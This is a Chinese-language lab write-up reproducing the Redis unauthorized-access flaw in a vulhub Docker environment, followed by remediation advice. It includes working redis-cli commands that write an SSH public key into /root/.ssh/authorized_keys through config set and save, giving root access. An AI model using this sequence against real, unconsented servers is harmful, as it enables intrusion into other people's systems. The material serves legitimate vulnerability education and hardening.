# Redis 未授权访问漏洞
## 漏洞简介
Redis服务若配置对外监听0.0.0.0，并且没有设置访问密码，攻击者可无需认证直接远程连接Redis。可以读取内部数据，还可以利用Redis写文件功能，向服务器写入SSH公钥、WebShell，最终实现服务器权限获取。漏洞端口：6379

## 靶场环境启动

进入漏洞目录：
![进入靶场目录](images/1.png)

执行命令启动靶场
![docker‑compose启动靶场，docker‑ps查看运行容器](images/2.png)

```bash
cd vulhub/redis/4-unacc
docker‑compose up -d
```

## 复现步骤

### 准备连接工具
```bash
yum install -y redis
```
宿主机安装 redis 客户端，提供 redis‑cli 命令用于连接靶场Redis服务
![yum安装redis客户端](images/3.png)
（图片太长，只截图前半段）最后出现Complete安装完成

1. 使用 redis‑cli 客户端直接连接目标，不需要输入密码
```
redis‑cli -h靶机容器IP
通过docker inspect 得到容器IP为 172.18.0.2

redis‑cli -h 172.18.0.2
```
2. 连接成功后执行 info 命令
```
info
```
![漏洞现象：没有密码校验，可以看到 redis 版本、操作系统等信息，说明已经成功进入 Redis，存在未授权访问
](images/5.png)

3. 获取全部 key 数据
```
keys *
```

## 漏洞利用：写入 SSH 公钥提权
```
config set dir /root/.ssh
config set dbfilename "authorized_keys"
set x "\n\nssh‑rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...\n\n"
save
```
save 执行成功，公钥写入靶机信任文件，可直接 ssh 登录服务器。


## 销毁靶场
```
cd vulhub/redis/4-unacc
docker‑compose down
```


## 修复方案
1. 修改 redis 配置，设置 bind 127.0.0.1，只允许本机访问，禁止 0.0.0.0 对外开放。
2. 设置访问密码 requirepass 自定义强密码，所有客户端连接必须密码认证。
3. 防火墙策略，6379 端口禁止暴露公网，限制可信来源 IP 访问。
4. Redis 使用普通低权限用户启动，禁止 root 账号运行 redis，降低写文件授权风险。
